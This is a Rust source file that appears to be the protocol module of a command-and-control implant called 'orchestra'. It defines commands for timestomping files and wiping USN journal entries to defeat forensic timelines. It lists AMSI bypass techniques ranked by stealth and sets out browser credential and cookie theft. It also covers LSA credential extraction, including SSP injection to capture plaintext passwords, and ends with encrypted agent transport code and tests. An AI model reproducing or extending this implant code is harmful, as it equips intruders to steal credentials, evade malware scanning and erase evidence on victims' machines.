    /// files in the directory tree.
    TimestompDirectory {
        /// Path to the directory whose files should be timestamped.
        dir_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file.
        reference_file: String,
    },
    /// Clean USN journal entries for a volume.  Removes entries that
    /// reference file modifications, preventing forensic timeline recovery
    /// of timestamp changes.
    CleanUsn {
        /// Volume path (e.g. "C:").  If empty, operates on the system volume.
        volume: String,
    },
    /// Synchronise timestamps for all recently modified files.  Scans for
    /// files modified within the current session and applies cover
    /// timestamps from the configured reference file.
    SyncTimestamps,
}

/// AMSI bypass strategy selector.
///
/// Controls which bypass technique the agent uses to neutralise Anti-Malware
/// Scan Interface scanning.  Each strategy has different OPSEC tradeoffs:
///
/// - **WriteRaid**: Data-only race condition — overwrites the AMSI init-failed
///   flag in `.data` so all subsequent scans return `AMSI_RESULT_CLEAN`.
///   No code patches, no hardware breakpoints, no `VirtualProtect` calls.
///   **Most stealthy**; preferred when available.
/// - **Hwbp**: Hardware breakpoint on `AmsiScanBuffer` via DR0/DR1 + VEH.
///   No `.text` modification, but breakpoint registers are monitorable.
/// - **MemoryPatch**: In-process code patch (`xor eax,eax; ret`).  Detectable
///   via code integrity checks and `VirtualProtect` hooks.
/// - **Auto**: Select the best available strategy (WriteRaid > Hwbp > MemoryPatch).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AmsiBypassMode {
    /// Hardware-breakpoint bypass via DR0/DR1 + VEH handler.
    Hwbp,
    /// In-process code patching of AmsiScanBuffer.
    MemoryPatch,
    /// Data-only race condition: overwrite AmsiInitFailed flag.
    WriteRaid,
    /// Automatically select the best available strategy.
    Auto,
}

/// Browser selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserType {
    Chrome,
    Edge,
    Firefox,
    All,
}

/// Data category selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserDataType {
    Credentials,
    Cookies,
    All,
}

/// LSA Whisperer method selector.
///
/// Controls how the LSA Whisperer extracts credentials from LSA authentication
/// packages.  Each method has different privilege requirements and OPSEC profiles:
///
/// - **Untrusted**: Uses `LsaConnectUntrusted` + `LsaCallAuthenticationPackage`
///   to query already-loaded SSPs (MSV1_0, Kerberos, WDigest).  No admin
///   privileges required — any process can connect to LSA.
/// - **SspInject**: Adds a custom SSP via registry that receives ALL
///   authentication events, including plaintext passwords during future logons.
///   Requires admin privileges.  Credentials are buffered in an encrypted ring.
/// - **Auto**: Try `SspInject` if the agent is elevated (or has a SYSTEM token),
///   else fall back to `Untrusted`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LsaMethod {
    /// Query already-loaded SSPs via LsaConnectUntrusted (no admin required).
    Untrusted,
    /// Inject a custom SSP to capture future authentication events (admin).
    SspInject,
    /// Automatically select the best available method.
    Auto,
}

/// Errors produced by [`CryptoSession`].
#[derive(Debug, Error)]
pub enum CryptoError {
    #[error("ciphertext is too short to contain a nonce")]
    Truncated,
    #[error("AES-GCM authentication failed")]
    AuthenticationFailed,
}

/// AES-256-GCM symmetric session keyed from a pre-shared secret.
///
/// # Forward Secrecy Upgrade Plan (Roadmap to X25519 + HKDF)
///
/// Currently, `CryptoSession` derives a static symmetric key via HKDF from a pre-shared
/// secret. This provides no forward secrecy: if the PSK is compromised, all past traffic
/// can be decrypted. We will transition to an Ephemeral Diffie-Hellman (X25519) key exchange.
///
/// ## Transition Plan & Backward Compatibility
///
/// 1. **Protocol Negotiation / Versioning:**
///    - Introduce a new handshake message or a version flag in the initial connection.
///    - Clients capable of Forward Secrecy will send an `X25519` key share in their first
///      message.
///    - Legacy clients will simply send data encrypted under the current static PSK.
///
/// 2. **Authentication via PSK:**
///    - To prevent Man-In-The-Middle (MITM) attacks during the DH exchange, the static
///      PSK will be repurposed as a MAC/signature key (or injected into the HKDF
///      extractor) to mutually authenticate the ephemeral `X25519` public keys before
///      deriving the final session keys.
///
/// 3. **HKDF Key Derivation:**
///    - The new session key will be derived as:
///      `HKDF(IKM = DH_shared_secret, salt = random_nonce, info = PSK)`
///    - This binds the X25519 ephemeral exchange to the trusted identity.
///
/// 4. **Deprecation Phases:**
///    - **Phase 1 (Dual Support):** Servers support both static AES-GCM (legacy) and
///      X25519 ephemeral (modern) to allow seamless agent upgrades.
///    - **Phase 2 (Warning):** Connections using the old static scheme log a security
///      warning and require a specific `--allow-legacy-crypto` flag.
///    - **Phase 3 (Removal):** Static PSK code paths are entirely dropped, and the PSK
///      is used exclusively for authenticating the ephemeral DH exchange.
pub struct CryptoSession {
    cipher: Aes256Gcm,
    /// Copy of the raw key bytes, zeroed on drop.
    key: [u8; KEY_LEN],
    /// HKDF salt associated with this session.
    salt: [u8; SALT_LEN],
    /// Optional pre-shared secret used to derive per-message keys from wire salts.
    pre_shared_secret: Option<Vec<u8>>,
}

impl Drop for CryptoSession {
    fn drop(&mut self) {
        self.key.zeroize();
        if let Some(psk) = self.pre_shared_secret.as_mut() {
            psk.zeroize();
        }
    }
}

impl CryptoSession {
    fn derive_key_bytes(pre_shared_secret: &[u8], salt: &[u8]) -> [u8; KEY_LEN] {
        let hk = hkdf::Hkdf::<Sha256>::new(Some(salt), pre_shared_secret);
        let mut key_bytes = [0u8; KEY_LEN];
        hk.expand(b"orchestra-aes-gcm", &mut key_bytes)
            .expect("HKDF-SHA256 expand must succeed");
        key_bytes
    }

    fn decrypt_nonce_prefixed(cipher: &Aes256Gcm, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if ciphertext.len() < NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (nonce_bytes, body) = ciphertext.split_at(NONCE_LEN);
        let nonce = Nonce::from_slice(nonce_bytes);
        cipher
            .decrypt(nonce, body)
            .map_err(|_| CryptoError::AuthenticationFailed)
    }

    /// Build a session from a pre-shared secret using HKDF-SHA256 and a random
    /// per-session salt.
    pub fn from_shared_secret(pre_shared_secret: &[u8]) -> Self {
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self::from_shared_secret_with_salt(pre_shared_secret, &salt)
    }

    /// Build a session from a pre-shared secret and an explicit HKDF salt.
    pub fn from_shared_secret_with_salt(pre_shared_secret: &[u8], salt: &[u8]) -> Self {
        let key_bytes = Self::derive_key_bytes(pre_shared_secret, salt);
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

        let mut salt_bytes = [0u8; SALT_LEN];
        let copy_len = salt.len().min(SALT_LEN);
        salt_bytes[..copy_len].copy_from_slice(&salt[..copy_len]);

        Self {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            salt: salt_bytes,
            pre_shared_secret: Some(pre_shared_secret.to_vec()),
        }
    }

    /// Build a session directly from a 32-byte key.
    pub fn from_key(key_bytes: [u8; KEY_LEN]) -> Self {
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            salt,
            pre_shared_secret: None,
        }
    }

    /// Return a reference to the raw 32-byte AES-256-GCM key.
    ///
    /// Intended for registering the key with the memory-guard subsystem so it
    /// is encrypted while the agent is idle.  Prefer calling
    /// `memory_guard::register_session_key` rather than reading these bytes
    /// directly.
    pub fn key_bytes(&self) -> &[u8; KEY_LEN] {
        &self.key
    }

    /// Encrypt `plaintext` and return `salt || nonce || ciphertext_with_tag`.
    pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        let mut nonce_bytes = [0u8; NONCE_LEN];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = self
            .cipher
            .encrypt(nonce, plaintext)
            .expect("AES-GCM encryption is infallible for valid inputs");

        let mut out = Vec::with_capacity(SALT_LEN + NONCE_LEN + ciphertext.len());
        out.extend_from_slice(&self.salt);
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ciphertext);
        out
    }

    /// Decrypt a nonce-prefixed buffer (`nonce || ciphertext_with_tag`).
    ///
    /// This method assumes `self` was already built with the correct key/salt
    /// context. Callers receiving full wire-format payloads prefixed with salt
    /// SHOULD use [`Self::decrypt_with_psk`].
    pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        // New format: salt || nonce || ciphertext_with_tag.
        // Try this path first for backward compatibility with existing callers
        // that pass encrypt() output directly to decrypt().
        if ciphertext.len() >= SALT_LEN + NONCE_LEN {
            let (salt, rest) = ciphertext.split_at(SALT_LEN);

            // If this session was created from a PSK, derive the per-message
            // key from the embedded salt so independently-created sessions
            // sharing the same PSK can still interoperate.
            if let Some(psk) = self.pre_shared_secret.as_ref() {
                let key_bytes = Self::derive_key_bytes(psk, salt);
                let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
                let cipher = Aes256Gcm::new(key);
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&cipher, rest) {
                    return Ok(plain);
                }
            } else if let Ok(plain) = Self::decrypt_nonce_prefixed(&self.cipher, rest) {
                // from_key sessions don't have a PSK; fall back to decrypting
                // the salt-stripped payload with the session key.
                return Ok(plain);
            }
        }

        // Legacy format: nonce || ciphertext_with_tag.
        Self::decrypt_nonce_prefixed(&self.cipher, ciphertext)
    }

    /// Decrypt a full wire-format message produced by [`Self::encrypt`]:
    /// `salt || nonce || ciphertext_with_tag`.
    pub fn decrypt_with_psk(psk: &[u8], wire_data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if wire_data.len() < SALT_LEN + NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (salt, rest) = wire_data.split_at(SALT_LEN);
        let session = Self::from_shared_secret_with_salt(psk, salt);
        session.decrypt(rest)
    }
}

pub mod transport;

/// Async transport abstraction over which framed [`Message`]s are exchanged.
///
/// Concrete implementations (TCP+TLS, QUIC, in-memory test harness) live in
/// downstream crates.
#[async_trait::async_trait]
pub trait Transport: Send {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()>;
    async fn recv(&mut self) -> anyhow::Result<Message>;
}

/// Blanket impl so that `Box<dyn Transport + Send>` can itself be used as a `Transport`.
#[async_trait::async_trait]
impl<T: Transport + ?Sized + Send> Transport for Box<T> {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()> {
        (**self).send(msg).await
    }
    async fn recv(&mut self) -> anyhow::Result<Message> {
        (**self).recv().await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let psk = b"orchestra-dev-secret";
        let session = CryptoSession::from_shared_secret(psk);
        let plaintext = b"hello orchestra";
        let ct = session.encrypt(plaintext);
        assert!(ct.len() > SALT_LEN + NONCE_LEN);
        let pt = CryptoSession::decrypt_with_psk(psk, &ct).expect("decrypt");
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn nonces_are_unique_per_encryption() {
        let a = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        let b = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        assert_ne!(a[..SALT_LEN], b[..SALT_LEN]);
        assert_ne!(a[SALT_LEN..SALT_LEN + NONCE_LEN], b[SALT_LEN..SALT_LEN + NONCE_LEN]);
        assert_ne!(a, b);
    }

    #[test]
    fn tampered_ciphertext_is_rejected() {
        let psk = b"k";
        let session = CryptoSession::from_shared_secret(psk);
        let mut ct = session.encrypt(b"payload");
        let mut idx = SALT_LEN + NONCE_LEN;
        if idx >= ct.len() {
            idx = ct.len() - 1;
        }
        ct[idx] ^= 0x01;
        let err = CryptoSession::decrypt_with_psk(psk, &ct).unwrap_err();
        assert!(matches!(err, CryptoError::AuthenticationFailed));
    }

    #[test]
    fn truncated_ciphertext_is_rejected() {
        let session = CryptoSession::from_shared_secret(b"k");
        let err = session.decrypt(&[0u8; NONCE_LEN - 1]).unwrap_err();
        assert!(matches!(err, CryptoError::Truncated));
    }

    #[test]
    fn message_serialization_roundtrip() {
        let msg = Message::TaskRequest {
            task_id: "t-1".into(),
            command: Command::RunApprovedScript {
                script: "rotate-logs".into(),
            },
            operator_id: None,
        };
        let bytes = bincode::serialize(&msg).unwrap();
        let back: Message = bincode::deserialize(&bytes).unwrap();
        match back {
            Message::TaskRequest {
                task_id, command, ..
            } => {
                assert_eq!(task_id, "t-1");
                assert!(matches!(
                    command,
                    Command::RunApprovedScript { script } if script == "rotate-logs"
                ));
            }
            _ => panic!("unexpected variant"),
        }
    }
}
